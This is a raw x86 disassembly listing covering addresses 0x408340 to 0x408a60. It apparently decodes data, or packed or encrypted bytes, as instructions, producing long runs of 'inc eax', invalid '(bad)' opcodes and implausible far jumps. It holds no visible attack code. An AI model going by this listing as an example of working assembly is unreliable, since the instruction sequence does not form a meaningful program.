  408340:	sub    edi,DWORD PTR [edi+0x429fc062]
  408346:	xor    al,0x40
  408348:	bound  eax,QWORD PTR [eax+0x40]
  40834b:	inc    eax
  40834c:	inc    eax
  40834d:	inc    eax
  40834e:	inc    eax
  40834f:	inc    eax
  408350:	inc    eax
  408351:	inc    DWORD PTR [eax-0x41]
  408354:	cmp    al,0x29
  408356:	out    dx,eax
  408357:	inc    ebp
  408358:	add    BYTE PTR [edx-0x33],0x94
  40835c:	push   0xfdf86663
  408361:	inc    eax
  408362:	inc    BYTE PTR [eax+0x40]
  408365:	inc    eax
  408366:	inc    eax
  408367:	inc    eax
  408368:	inc    eax
  408369:	inc    eax
  40836a:	inc    eax
  40836b:	inc    eax
  40836c:	inc    eax
  40836d:	jmp    0x463d:0x681bc005
  408374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408375:	inc    ebx
  408376:	scas   eax,DWORD PTR es:[edi]
  408377:	test   eax,0x28621366
  40837c:	fs enter 0x5650,0x1f
  408381:	shl    DWORD PTR [ebx],0x40
  408384:	inc    eax
  408385:	inc    eax
  408386:	inc    eax
  408387:	inc    eax
  408388:	inc    eax
  408389:	inc    eax
  40838a:	inc    eax
  40838b:	add    BYTE PTR [eax],dl
  40838d:	(bad)  
  40838e:	int3   
  40838f:	outs   dx,BYTE PTR ds:[esi]
  408390:	ror    BYTE PTR [ecx],0x63
  408393:	les    edi,FWORD PTR [esp+ebp*8-0x62cc6ff0]
  40839a:	imul   esp,DWORD PTR [edx+0x5],0xaa42a862
  4083a1:	inc    esi
  4083a2:	xor    eax,0x515cd2c
  4083a7:	inc    eax
  4083a8:	inc    eax
  4083a9:	inc    eax
  4083aa:	inc    eax
  4083ab:	inc    eax
  4083ac:	inc    eax
  4083ad:	and    eax,0x25404040
  4083b2:	sbb    eax,0x46286e55
  4083b7:	int    0xcd
  4083b9:	jl     0x40837d
  4083bb:	push   es
  4083bc:	mov    ecx,0x41c240fd
  4083c1:	(bad)  
  4083c2:	test   eax,0x4da2c3d5
  4083c7:	cs in  eax,0xae
  4083ca:	inc    eax
  4083cb:	inc    eax
  4083cc:	inc    eax
  4083cd:	inc    eax
  4083ce:	inc    eax
  4083cf:	inc    eax
  4083d0:	inc    eax
  4083d1:	inc    eax
  4083d2:	inc    eax
  4083d3:	inc    eax
  4083d4:	ins    BYTE PTR es:[edi],dx
  4083d5:	pop    edx
  4083d6:	adc    BYTE PTR [eax+edi*1+0x63],ah
  4083da:	les    ecx,FWORD PTR [edx-0x40]
  4083dd:	push   ecx
  4083de:	dec    esp
  4083df:	and    BYTE PTR [ecx+edx*4+0x44a90a4c],bh
  4083e6:	inc    eax
  4083e7:	inc    eax
  4083e8:	inc    eax
  4083e9:	inc    eax
  4083ea:	inc    eax
  4083eb:	inc    eax
  4083ec:	rol    DWORD PTR [eax+0x40],0xf7
  4083f0:	sub    BYTE PTR ds:0x45520884,al
  4083f6:	jno    0x408447
  4083f8:	inc    esi
  4083f9:	xchg   DWORD PTR [edx+0x41],edx
  4083fc:	cwde   
  4083fd:	sar    BYTE PTR [esi+0x48],0x98
  408401:	adc    al,0x72
  408403:	and    al,BYTE PTR [ebx-0x57]
  408406:	xor    eax,0x34c405
  40840b:	outs   dx,DWORD PTR ds:[esi]
  40840c:	add    eax,0xce48bfdb
  408411:	inc    edx
  408412:	inc    eax
  408413:	inc    eax
  408414:	add    BYTE PTR [eax+0x40],al
  408417:	inc    eax
  408418:	inc    eax
  408419:	inc    eax
  40841a:	inc    eax
  40841b:	push   edx
  40841c:	test   al,0x65
  40841e:	rcl    BYTE PTR [eax-0x35],0x61
  408422:	dec    ebx
  408423:	mov    al,0x10
  408425:	shl    BYTE PTR [eax+0x19],1
  408428:	sar    BYTE PTR [esp+ebp*1],1
  40842b:	push   ebp
  40842c:	pop    eax
  40842d:	out    0x40,eax
  40842f:	inc    eax
  408430:	inc    eax
  408431:	inc    eax
  408432:	inc    eax
  408433:	inc    eax
  408434:	inc    eax
  408435:	inc    eax
  408436:	inc    eax
  408437:	inc    eax
  408438:	jmp    0x41c9:0x1a0f625c
  40843f:	stos   BYTE PTR es:[edi],al
  408440:	add    edx,eax
  408442:	jp     0x408478
  408444:	stos   DWORD PTR es:[edi],eax
  408445:	or     eax,DWORD PTR [eax+eax*2+0x40]
  408449:	inc    eax
  40844a:	inc    eax
  40844b:	inc    eax
  40844c:	inc    eax
  40844d:	int3   
  40844e:	jne    0x408490
  408450:	or     eax,ecx
  408452:	sub    al,0x34
  408454:	gs inc eax
  408456:	stos   DWORD PTR es:[edi],eax
  408457:	int3   
  408458:	iret   
  408459:	push   edi
  40845a:	inc    ebx
  40845b:	cmp    al,0x8e
  40845d:	inc    eax
  40845e:	mov    esp,0x71c01778
  408463:	mov    dh,0x6d
  408465:	inc    eax
  408466:	xchg   edi,eax
  408467:	inc    eax
  408468:	add    cl,al
  40846a:	inc    eax
  40846b:	inc    eax
  40846c:	inc    eax
  40846d:	inc    eax
  40846e:	add    BYTE PTR [eax-0x58],al
  408471:	andps  xmm4,XMMWORD PTR cs:[edx-0x18]
  408476:	inc    ecx
  408477:	aas    
  408478:	and    eax,0xb8755bc9
  40847d:	and    DWORD PTR [eax+0x40e934bb],edi
  408483:	inc    eax
  408484:	inc    eax
  408485:	inc    eax
  408486:	inc    eax
  408487:	inc    eax
  408488:	inc    eax
  408489:	inc    eax
  40848a:	inc    DWORD PTR [eax-0x3e]
  40848d:	dec    edx
  40848e:	inc    edi
  40848f:	std    
  408490:	add    eax,0x7f4941fc
  408495:	pop    ss
  408496:	mov    cl,0xa1
  408498:	xchg   DWORD PTR [edx-0x15],ebp
  40849b:	adc    DWORD PTR [ebp+0x0],eax
  40849e:	pop    ebx
  40849f:	fs inc edi
  4084a1:	dec    ecx
  4084a2:	mov    esp,0xb834c0d1
  4084a7:	inc    ecx
  4084a8:	xor    eax,0xa9a565dc
  4084ad:	inc    eax
  4084ae:	inc    eax
  4084af:	inc    eax
  4084b0:	inc    eax
  4084b1:	inc    eax
  4084b2:	inc    eax
  4084b3:	inc    eax
  4084b4:	inc    eax
  4084b5:	inc    eax
  4084b6:	inc    eax
  4084b7:	and    dl,BYTE PTR [ebp+0x534240f4]
  4084bd:	push   es
  4084be:	inc    eax
  4084bf:	sahf   
  4084c0:	pop    ebp
  4084c1:	outs   dx,BYTE PTR ds:[esi]
  4084c2:	mov    ah,0x8c
  4084c4:	clc    
  4084c5:	es xchg esp,eax
  4084c7:	inc    ebp
  4084c8:	bound  ebp,QWORD PTR [eax-0x6b5692c3]
  4084ce:	xor    edx,ecx
  4084d0:	out    0x11,al
  4084d2:	ret    
  4084d3:	(bad)  
  4084d4:	pop    esi
  4084d5:	sub    al,0x40
  4084d7:	inc    eax
  4084d8:	inc    eax
  4084d9:	inc    eax
  4084da:	inc    eax
  4084db:	inc    eax
  4084dc:	inc    eax
  4084dd:	inc    eax
  4084de:	add    ah,dh
  4084e0:	jns    0x4084ba
  4084e2:	int    0xb4
  4084e4:	and    al,0xc1
  4084e6:	ffree  st(3)
  4084e8:	adc    DWORD PTR [edx-0x65],esp
  4084eb:	add    eax,0x3e36b462
  4084f0:	dec    edi
  4084f1:	cmp    eax,0xd4bc962
  4084f6:	(bad)  
  4084f7:	enter  0xcc31,0xcb
  4084fb:	inc    eax
  4084fc:	inc    eax
  4084fd:	inc    eax
  4084fe:	inc    eax
  4084ff:	inc    eax
  408500:	inc    eax
  408501:	and    eax,0x92404040
  408506:	cmp    al,0xc9
  408508:	leave  
  408509:	xor    eax,DWORD PTR [eax]
  40850b:	pop    ss
  40850c:	push   edx
  40850d:	mov    edi,0x35514ac4
  408512:	xchg   ebx,eax
  408513:	cmp    ecx,esp
  408515:	inc    edx
  408516:	inc    eax
  408517:	inc    eax
  408518:	inc    eax
  408519:	inc    eax
  40851a:	inc    eax
  40851b:	inc    eax
  40851c:	inc    eax
  40851d:	inc    eax
  40851e:	inc    eax
  40851f:	inc    eax
  408520:	test   al,0x46
  408522:	mov    cl,0xc3
  408524:	inc    esi
  408525:	fst    QWORD PTR [eax+eax*2+0x10]
  408529:	or     al,0x4c
  40852b:	inc    esp
  40852c:	push   edi
  40852d:	arpl   WORD PTR [ecx+ecx*2+0x6d],di
  408531:	int    0xbe
  408533:	rol    BYTE PTR [ecx-0x13],0xa8
  408537:	cmp    bh,cl
  408539:	push   eax
  40853a:	stos   DWORD PTR es:[edi],eax
  40853b:	and    esi,DWORD PTR [ebp-0x14]
  40853e:	mov    es,WORD PTR [ebx+0x52]
  408541:	add    BYTE PTR [esi+0x40404040],bh
  408547:	inc    eax
  408548:	inc    eax
  408549:	rol    DWORD PTR [eax+0x40],0x33
  40854d:	push   0x45c86663
  408552:	inc    esi
  408553:	jno    0x408517
  408555:	shr    DWORD PTR [edx],1
  408557:	data16 jnp 0x4084e6
  40855a:	inc    eax
  40855b:	(bad)  ds:0xa8c41c2c
  408561:	push   edx
  408562:	inc    eax
  408563:	inc    eax
  408564:	add    BYTE PTR [eax+0x40],al
  408567:	inc    eax
  408568:	inc    eax
  408569:	inc    eax
  40856a:	inc    eax
  40856b:	cmp    al,0x3c
  40856d:	cs mov cl,0x63
  408570:	dec    edi
  408571:	adc    DWORD PTR [edx+0x1c],edx
  408574:	sub    BYTE PTR [ecx],ch
  408576:	mov    edi,0x4040402a
  40857b:	inc    eax
  40857c:	inc    eax
  40857d:	inc    eax
  40857e:	inc    eax
  40857f:	inc    eax
  408580:	inc    eax
  408581:	inc    eax
  408582:	inc    eax
  408583:	dec    esp
  408584:	fs test al,0xd2
  408587:	ret    0xa961
  40858a:	mov    ds:0x5f54690d,al
  40858f:	sub    eax,0xcbd78091
  408594:	inc    eax
  408595:	inc    eax
  408596:	inc    eax
  408597:	inc    eax
  408598:	inc    eax
  408599:	inc    eax
  40859a:	int3   
  40859b:	jne    0x4085dd
  40859d:	test   BYTE PTR [eax],dh
  40859f:	retf   0x795a
  4085a2:	jae    0x408609
  4085a4:	adc    BYTE PTR [ebx+ecx*8],dh
  4085a7:	rol    al,1
  4085a9:	cmc    
  4085aa:	inc    edi
  4085ab:	inc    edi
  4085ac:	lods   al,BYTE PTR ds:[esi]
  4085ad:	lea    eax,[eax-0x15]
  4085b0:	inc    eax
  4085b1:	add    cl,al
  4085b3:	inc    eax
  4085b4:	inc    eax
  4085b5:	inc    eax
  4085b6:	inc    eax
  4085b7:	add    BYTE PTR [eax+0x3],al
  4085ba:	inc    edx
  4085bb:	inc    edx
  4085bc:	and    BYTE PTR ds:0x41e94062,al
  4085c2:	aad    0x1e
  4085c4:	jmp    0x2ec5:0xaf4fcfcd
  4085cb:	and    BYTE PTR [ebp+0x67],dh
  4085ce:	cmp    BYTE PTR [esp+ecx*2],ah
  4085d1:	sub    eax,0x34a869b1
  4085d6:	inc    eax
  4085d7:	inc    eax
  4085d8:	inc    eax
  4085d9:	inc    eax
  4085da:	inc    eax
  4085db:	inc    eax
  4085dc:	inc    eax
  4085dd:	inc    eax
  4085de:	inc    DWORD PTR [eax-0x6b]
  4085e1:	test   al,0x61
  4085e3:	ret    0x4c52
  4085e6:	inc    ebx
  4085e7:	dec    ecx
  4085e8:	arpl   WORD PTR [eax-0x2c],ax
  4085eb:	outs   dx,BYTE PTR ds:[esi]
  4085ec:	push   ebx
  4085ed:	lods   al,BYTE PTR ds:[esi]
  4085ee:	sub    al,BYTE PTR [ebp-0x19]
  4085f1:	mov    dl,0xd8
  4085f3:	push   ss
  4085f4:	push   edx
  4085f5:	ret    
  4085f6:	inc    ebx
  4085f7:	inc    eax
  4085f8:	inc    eax
  4085f9:	inc    eax
  4085fa:	inc    eax
  4085fb:	inc    eax
  4085fc:	inc    eax
  4085fd:	inc    eax
  4085fe:	inc    eax
  4085ff:	inc    eax
  408600:	inc    eax
  408601:	and    ah,ch
  408603:	add    eax,0x6f5004b
  408608:	sub    dl,BYTE PTR [edx-0x3eae79ab]
  40860e:	inc    eax
  40860f:	inc    DWORD PTR [edi+edi*4+0x10]
  408613:	cmp    eax,0x40404042
  408618:	inc    eax
  408619:	inc    eax
  40861a:	inc    eax
  40861b:	inc    eax
  40861c:	inc    eax
  40861d:	add    BYTE PTR [esi+0x11],ch
  408620:	imul   ecx,DWORD PTR [edx],0xe5b1b840
  408626:	ret    0x844
  408629:	int3   
  40862a:	inc    eax
  40862b:	add    eax,0x51217a05
  408630:	fsub   QWORD PTR [edx+0x41]
  408633:	int    0x86
  408635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408636:	and    BYTE PTR [edi+0x40404063],bh
  40863c:	inc    eax
  40863d:	inc    eax
  40863e:	inc    eax
  40863f:	and    eax,0x90404040
  408644:	or     al,0x41
  408646:	xor    esi,DWORD PTR [eax]
  408648:	rol    DWORD PTR [edx+0x43],0x80
  40864c:	ror    BYTE PTR [ecx-0x50],1
  40864f:	xchg   BYTE PTR [edi-0x65],dl
  408652:	shr    BYTE PTR [ecx-0x35],1
  408655:	mov    esp,0x4ac18905
  40865a:	retf   
  40865b:	lahf   
  40865c:	mov    edi,0x40408629
  408661:	inc    eax
  408662:	inc    eax
  408663:	inc    eax
  408664:	inc    eax
  408665:	inc    eax
  408666:	inc    eax
  408667:	inc    eax
  408668:	inc    eax
  408669:	les    edi,FWORD PTR [edi+0x12]
  40866c:	inc    eax
  40866d:	sub    BYTE PTR [edi-0x3ad29a24],bh
  408673:	xor    ecx,DWORD PTR [ecx]
  408675:	ret    
  408676:	push   cs
  408677:	dec    ebp
  408678:	scas   eax,DWORD PTR es:[edi]
  408679:	shl    BYTE PTR [esi+0x4b],0x69
  40867d:	sub    eax,0x79052016
  408682:	(bad)
  408685:	mov    ebp,0x738668a8
  40868a:	push   0x114c4007
  40868f:	inc    eax
  408690:	inc    eax
  408691:	inc    eax
  408692:	inc    eax
  408693:	inc    eax
  408694:	inc    eax
  408695:	rol    DWORD PTR [eax+0x40],0x6a
  408699:	cmp    al,0x5
  40869b:	ret    
  40869c:	mov    cl,0x6f
  40869e:	pop    edi
  40869f:	lods   al,BYTE PTR ds:[esi]
  4086a0:	cld    
  4086a1:	scas   al,BYTE PTR es:[edi]
  4086a2:	mov    edi,0xddb2419f
  4086a7:	or     eax,0x78f10562
  4086ac:	pop    ss
  4086ad:	bound  edx,QWORD PTR [ecx-0x33]
  4086b0:	leave  
  4086b1:	xchg   BYTE PTR [edx-0x37],al
  4086b4:	push   ds
  4086b5:	std    
  4086b6:	rcl    BYTE PTR [eax],0xbc
  4086b9:	xor    edi,DWORD PTR [edx-0x17]
  4086bc:	icebp  
  4086bd:	ret    
  4086be:	inc    eax
  4086bf:	inc    eax
  4086c0:	add    BYTE PTR [eax+0x40],al
  4086c3:	inc    eax
  4086c4:	inc    eax
  4086c5:	inc    eax
  4086c6:	inc    eax
  4086c7:	push   0x53adeb58
  4086cc:	inc    ecx
  4086cd:	inc    edi
  4086ce:	inc    ebp
  4086cf:	retf   
  4086d0:	add    eax,0x5d11050a
  4086d5:	xchg   ecx,eax
  4086d6:	cmp    dl,BYTE PTR [edi-0x35]
  4086d9:	arpl   WORD PTR [esi+0x2d9f4163],ax
  4086df:	fld    DWORD PTR [eax+0x48]
  4086e2:	fld    DWORD PTR gs:[eax+0x40]
  4086e6:	inc    eax
  4086e7:	inc    eax
  4086e8:	inc    eax
  4086e9:	inc    eax
  4086ea:	inc    eax
  4086eb:	inc    eax
  4086ec:	inc    eax
  4086ed:	inc    eax
  4086ee:	daa    
  4086ef:	inc    ebp
  4086f0:	mov    BYTE PTR [eax+eax*2],dh
  4086f3:	xor    al,0xac
  4086f5:	push   esi
  4086f6:	inc    ecx
  4086f7:	xor    dl,BYTE PTR [ebx+0x7e]
  4086fa:	inc    eax
  4086fb:	mov    dl,0x5
  4086fd:	pop    esi
  4086fe:	test   eax,0xdcea872d
  408703:	(bad)  
  408704:	xchg   BYTE PTR [ebp+0x41],dh
  408707:	dec    ebp
  408708:	dec    edx
  408709:	cmp    al,ah
  40870b:	bound  edi,QWORD PTR [esp+ebx*2]
  40870e:	inc    eax
  40870f:	inc    eax
  408710:	inc    eax
  408711:	inc    eax
  408712:	inc    eax
  408713:	inc    eax
  408714:	int3   
  408715:	jne    0x408757
  408717:	popa   
  408718:	repz or BYTE PTR [ebx+0x4f],al
  40871c:	dec    esi
  40871d:	stos   DWORD PTR es:[edi],eax
  40871e:	jb     0x408760
  408720:	jle    0x4086dc
  408722:	or     BYTE PTR [eax+0x35],al
  408725:	add    eax,0x62992ede
  40872a:	push   edx
  40872b:	pop    eax
  40872c:	and    eax,0x5485a586
  408731:	inc    ebp
  408732:	inc    ecx
  408733:	dec    ebx
  408734:	cmp    ah,BYTE PTR [esp+edx*4]
  408737:	inc    ecx
  408738:	ss inc eax
  40873a:	add    cl,al
  40873c:	inc    eax
  40873d:	inc    eax
  40873e:	inc    eax
  40873f:	inc    eax
  408740:	add    BYTE PTR [eax+0x38],al
  408743:	loopne 0x408785
  408745:	bound  ebp,QWORD PTR [edx+0x312bbda0]
  40874b:	add    eax,0xbe054c42
  408750:	jg     0x4087b4
  408752:	push   edi
  408753:	xchg   esp,edx
  408755:	pop    DWORD PTR [esi-0x572db806]
  40875b:	inc    edi
  40875c:	out    0x6d,al
  40875e:	gs loopne 0x4086ec
  408761:	aaa    
  408762:	adc    DWORD PTR [ebx+0x40404040],ebp
  408768:	inc    eax
  408769:	inc    eax
  40876a:	inc    eax
  40876b:	inc    eax
  40876c:	inc    DWORD PTR [eax-0x3c]
  40876f:	bound  ebp,QWORD PTR [ecx+0x41fa4271]
  408775:	inc    ecx
  408776:	dec    edi
  408777:	aad    0x5
  408779:	mov    ds:0x30bf0d2d,eax
  40877e:	inc    eax
  40877f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408780:	xchg   BYTE PTR [edi+0x4cfc730f],bh
  408786:	inc    eax
  408787:	inc    eax
  408788:	inc    eax
  408789:	inc    eax
  40878a:	inc    eax
  40878b:	inc    eax
  40878c:	inc    eax
  40878d:	inc    eax
  40878e:	inc    eax
  40878f:	inc    eax
  408790:	dec    esp
  408791:	test   al,0x3b
  408793:	and    al,BYTE PTR [edx+0x40]
  408796:	bound  esp,QWORD PTR [ebx+0x3d]
  408799:	mov    edi,0xd13365a8
  40879e:	int    0x61
  4087a0:	ret    
  4087a1:	sub    al,BYTE PTR ds:0xcb434f4a
  4087a7:	dec    eax
  4087a8:	dec    edx
  4087a9:	adc    DWORD PTR [esi-0x40cbb58],eax
  4087af:	bound  esi,QWORD PTR ds:0x2a0064b8
  4087b5:	outs   dx,BYTE PTR ds:[esi]
  4087b6:	inc    eax
  4087b7:	inc    eax
  4087b8:	inc    eax
  4087b9:	inc    eax
  4087ba:	inc    eax
  4087bb:	inc    eax
  4087bc:	inc    eax
  4087bd:	inc    eax
  4087be:	add    BYTE PTR [esi+0x40444050],dh
  4087c4:	mov    bl,0x49
  4087c6:	cmc    
  4087c7:	push   esi
  4087c8:	dec    esp
  4087c9:	push   esp
  4087ca:	and    edx,esp
  4087cc:	xchg   esi,eax
  4087cd:	inc    edx
  4087ce:	jg     0x408811
  4087d0:	jnp    0x40880f
  4087d2:	sbb    al,0x9c
  4087d4:	pushf  
  4087d5:	xchg   ebp,eax
  4087d6:	xchg   edx,eax
  4087d7:	xor    al,0x49
  4087d9:	ret    
  4087da:	bound  esp,QWORD PTR [edx+0x40]
  4087dd:	inc    eax
  4087de:	inc    eax
  4087df:	inc    eax
  4087e0:	inc    eax
  4087e1:	inc    eax
  4087e2:	and    eax,0x94404040
  4087e7:	xor    al,0x2e
  4087e9:	aad    0x41
  4087eb:	inc    esi
  4087ec:	dec    ebp
  4087ed:	test   eax,0xcd02e723
  4087f2:	inc    eax
  4087f3:	xor    al,0x4
  4087f5:	mov    eax,0x441341d0
  4087fa:	aam    0x40
  4087fc:	push   ebx
  4087fd:	fs inc eax
  4087ff:	inc    eax
  408800:	inc    eax
  408801:	inc    eax
  408802:	inc    eax
  408803:	inc    eax
  408804:	inc    eax
  408805:	inc    eax
  408806:	inc    eax
  408807:	inc    eax
  408808:	dec    edi
  408809:	imul   eax,DWORD PTR [esi+0x2a],0x524c4855
  408810:	fld    QWORD PTR [edx-0x2d]
  408813:	inc    esp
  408814:	loope  0x408853
  408816:	bound  esp,QWORD PTR [edx+0x34]
  408819:	xor    BYTE PTR [ebx-0x4e3ccad6],bh
  40881f:	sub    BYTE PTR [edx-0x1fbcbaa1],0x40
  408826:	arpl   bp,ax
  408828:	stos   DWORD PTR es:[edi],eax
  408829:	inc    eax
  40882a:	inc    eax
  40882b:	inc    eax
  40882c:	inc    eax
  40882d:	inc    eax
  40882e:	inc    eax
  40882f:	rol    DWORD PTR [eax+0x40],0x44
  408833:	jbe    0x40883c
  408835:	dec    ebp
  408836:	inc    eax
  408837:	inc    esi
  408838:	inc    eax
  408839:	nop
  40883a:	and    al,0x6c
  40883c:	add    BYTE PTR [ebx+0x40],0x94
  408840:	inc    eax
  408841:	scas   eax,DWORD PTR es:[edi]
  408842:	inc    eax
  408843:	inc    eax
  408844:	add    BYTE PTR [eax+0x40],al
  408847:	inc    eax
  408848:	inc    eax
  408849:	inc    eax
  40884a:	inc    eax
  40884b:	sbb    DWORD PTR [eax+0x62],eax
  40884e:	mov    esp,0xf04f8340
  408853:	inc    edx
  408854:	and    al,0xbf
  408856:	or     eax,0x4040bcb8
  40885b:	inc    eax
  40885c:	inc    eax
  40885d:	inc    eax
  40885e:	inc    eax
  40885f:	inc    eax
  408860:	inc    eax
  408861:	inc    eax
  408862:	inc    eax
  408863:	loope  0x4087ef
  408865:	xor    BYTE PTR [edx-0x41],ah
  408868:	retf   
  408869:	add    eax,0x2a5fa8df
  40886e:	mov    cl,0xbd
  408870:	dec    eax
  408871:	xchg   esp,edi
  408873:	dec    ecx
  408874:	mov    eax,0x40544649
  408879:	inc    eax
  40887a:	inc    eax
  40887b:	inc    eax
  40887c:	inc    eax
  40887d:	inc    eax
  40887e:	int3   
  40887f:	jne    0x4088c1
  408881:	add    dl,BYTE PTR [ebp+eiz*2+0x34]
  408885:	mov    al,BYTE PTR [eax+0x11]
  408888:	lds    eax,FWORD PTR [ebp-0x54]
  40888b:	dec    eax
  40888c:	inc    esi
  40888d:	outs   dx,BYTE PTR ds:[esi]
  40888e:	cmp    dl,ch
  408890:	xchg   DWORD PTR [ecx-0x3d],ecx
  408893:	add    eax,0x31c512da
  408898:	inc    eax
  408899:	add    cl,al
  40889b:	inc    eax
  40889c:	inc    eax
  40889d:	inc    eax
  40889e:	inc    eax
  40889f:	add    BYTE PTR [eax+0x79],al
  4088a2:	and    BYTE PTR [ebx+eiz*2+0x7c43fb20],ch
  4088a9:	inc    esp
  4088aa:	gs retf 
  4088ac:	nop
  4088ad:	dec    edi
  4088ae:	lods   eax,DWORD PTR ds:[esi]
  4088af:	sub    DWORD PTR [ecx+0x17],edx
  4088b2:	xor    al,0x15
  4088b4:	mov    bh,0x64
  4088b6:	jmp    0x613557fe
  4088bb:	dec    esi
  4088bc:	inc    edx
  4088bd:	pop    ebp
  4088be:	dec    ebx
  4088bf:	and    DWORD PTR [ecx+0x62],esp
  4088c2:	mov    eax,ds:0x40404740
  4088c7:	inc    eax
  4088c8:	inc    eax
  4088c9:	inc    eax
  4088ca:	inc    eax
  4088cb:	inc    eax
  4088cc:	inc    eax
  4088cd:	inc    DWORD PTR [eax+0x63]
  4088d0:	xchg   esp,eax
  4088d1:	inc    ebx
  4088d2:	jno    0x4088ff
  4088d4:	ret    
  4088d5:	inc    eax
  4088d6:	cmp    BYTE PTR ds:0x306b0f20,cl
  4088dc:	push   eax
  4088dd:	inc    eax
  4088de:	add    eax,0x40404040
  4088e3:	inc    eax
  4088e4:	inc    eax
  4088e5:	inc    eax
  4088e6:	inc    eax
  4088e7:	inc    eax
  4088e8:	inc    eax
  4088e9:	sbb    BYTE PTR [ebx+0x42],0xf1
  4088ed:	cs or  eax,0x8816cb67
  4088f3:	ss inc ebx
  4088f5:	(bad)  
  4088f6:	retf   
  4088f7:	mov    WORD PTR [edi+0x58],es
  4088fa:	jecxz  0x408951
  4088fc:	push   eax
  4088fd:	test   al,0x76
  4088ff:	cmp    DWORD PTR [esi+0x40404040],0x40
  408906:	inc    eax
  408907:	inc    eax
  408908:	inc    eax
  408909:	add    BYTE PTR ds:0x41364127,cl
  40890f:	xor    eax,0x6bded11d
  408914:	std    
  408915:	inc    ebp
  408916:	sub    al,BYTE PTR [eax+0x40]
  408919:	inc    eax
  40891a:	inc    eax
  40891b:	inc    eax
  40891c:	inc    eax
  40891d:	and    eax,0x47404040
  408922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408923:	test   al,0x64
  408925:	push   ds
  408926:	add    eax,0xcb411172
  40892b:	push   0x32407320
  408930:	inc    ebx
  408931:	cmp    al,0x1e
  408933:	sub    esp,DWORD PTR [edi-0x68]
  408936:	xor    DWORD PTR [ecx+0x28],esi
  408939:	aad    0x40
  40893b:	inc    eax
  40893c:	inc    eax
  40893d:	inc    eax
  40893e:	inc    eax
  40893f:	inc    eax
  408940:	inc    eax
  408941:	inc    eax
  408942:	inc    eax
  408943:	inc    eax
  408944:	mov    al,0x30
  408946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408947:	jbe    0x408960
  408949:	shl    DWORD PTR [esp+eax*2],1
  40894c:	add    eax,0x418f05bc
  408951:	pop    esi
  408952:	int    0x7b
  408954:	retf   
  408955:	add    eax,0x514b03cb
  40895a:	int    0xac
  40895c:	mov    al,0xce
  40895e:	inc    eax
  40895f:	inc    eax
  408960:	inc    eax
  408961:	inc    eax
  408962:	inc    eax
  408963:	inc    eax
  408964:	rol    DWORD PTR [eax+0x40],0x40
  408968:	repnz inc eax
  40896a:	stos   DWORD PTR es:[edi],eax
  40896b:	imul   eax,DWORD PTR ds:0x82412605,0xcb5e6933
  408975:	leave  
  408976:	inc    esi
  408977:	xor    eax,DWORD PTR [eax]
  408979:	ss xchg ecx,eax
  40897b:	pop    esp
  40897c:	mov    eax,0x4040ab4c
  408981:	add    BYTE PTR [eax+0x40],al
  408984:	inc    eax
  408985:	inc    eax
  408986:	inc    eax
  408987:	inc    eax
  408988:	nop
  408989:	mov    es,WORD PTR [eax+0x43]
  40898c:	inc    ecx
  40898d:	adc    eax,0xfa62bc84
  408992:	sub    BYTE PTR [edx+0x5c3cbc4],dh
  408998:	outs   dx,DWORD PTR ds:[esi]
  408999:	pop    DWORD PTR [eax+0x36]
  40899c:	int    0x7
  40899e:	mov    edi,0xf4f5a0c9
  4089a3:	inc    ebp
  4089a4:	outs   dx,DWORD PTR ds:[esi]
  4089a5:	xor    al,0xbf
  4089a7:	dec    esp
  4089a8:	bound  ebx,QWORD PTR [esi]
  4089aa:	and    edx,ecx
  4089ac:	and    DWORD PTR [eax-0x43],eax
  4089af:	inc    eax
  4089b0:	inc    eax
  4089b1:	inc    eax
  4089b2:	inc    eax
  4089b3:	inc    eax
  4089b4:	inc    eax
  4089b5:	inc    eax
  4089b6:	inc    eax
  4089b7:	inc    eax
  4089b8:	inc    eax
  4089b9:	add    eax,0x502e4540
  4089be:	bound  eax,QWORD PTR [eax-0x78]
  4089c1:	inc    ebx
  4089c2:	mov    al,ds:0xed334192
  4089c7:	add    DWORD PTR [eax+0x40],eax
  4089ca:	inc    eax
  4089cb:	inc    eax
  4089cc:	inc    eax
  4089cd:	inc    eax
  4089ce:	int3   
  4089cf:	jne    0x408a11
  4089d1:	test   al,0x48
  4089d3:	cmp    eax,0xac7b4664
  4089d8:	enter  0x8411,0xc3
  4089dc:	test   BYTE PTR [eax-0x21],0x53
  4089e0:	cld    
  4089e1:	dec    eax
  4089e2:	inc    edi
  4089e3:	dec    ebp
  4089e4:	stos   BYTE PTR es:[di],al
  4089e6:	imul   eax,DWORD PTR [edi+0x341e0dcd],0xc1004089
  4089f0:	inc    eax
  4089f1:	inc    eax
  4089f2:	inc    eax
  4089f3:	inc    eax
  4089f4:	add    BYTE PTR [eax+0x40],al
  4089f7:	sar    DWORD PTR [edi+0x40fccb7c],1
  4089fd:	mov    gs,WORD PTR ds:0x40c3aa74
  408a03:	bound  ebp,QWORD PTR [edi+eax*4-0x47592ab6]
  408a0a:	sub    ah,BYTE PTR [ebp+edi*1+0x4c]
  408a0e:	inc    eax
  408a0f:	lahf   
  408a10:	bound  eax,QWORD PTR [edx+0x10]
  408a13:	cmp    eax,ebx
  408a15:	inc    eax
  408a16:	inc    eax
  408a17:	inc    eax
  408a18:	inc    eax
  408a19:	inc    eax
  408a1a:	inc    eax
  408a1b:	inc    eax
  408a1c:	inc    eax
  408a1d:	inc    DWORD PTR [eax-0x3d]
  408a20:	and    DWORD PTR [eax+esi*1+0x40],esp
  408a24:	dec    esp
  408a25:	loope  0x408a7a
  408a27:	fisub  WORD PTR [edx]
  408a29:	icebp  
  408a2a:	mov    eax,0x486405a9
  408a2f:	mov    al,0x22
  408a31:	inc    edx
  408a32:	bound  esi,QWORD PTR [eax-0x35]
  408a35:	jbe    0x408a5f
  408a37:	cmp    BYTE PTR [edx-0xe],al
  408a3a:	mov    edi,0xc4f05569
  408a3f:	mov    cl,0x34
  408a41:	and    al,0xbf
  408a43:	dec    ecx
  408a44:	xor    al,0x40
  408a46:	inc    eax
  408a47:	inc    eax
  408a48:	inc    eax
  408a49:	inc    eax
  408a4a:	inc    eax
  408a4b:	inc    eax
  408a4c:	inc    eax
  408a4d:	inc    eax
  408a4e:	inc    eax
  408a4f:	bound  ebx,QWORD PTR [ebx-0x29]
  408a52:	push   ds
  408a53:	gs mov esi,0xd43440ab
  408a59:	call   0x6dfcfba0
  408a5e:	pushf  
  408a5f:	dec    eax
  408a60:	add    ch,cl
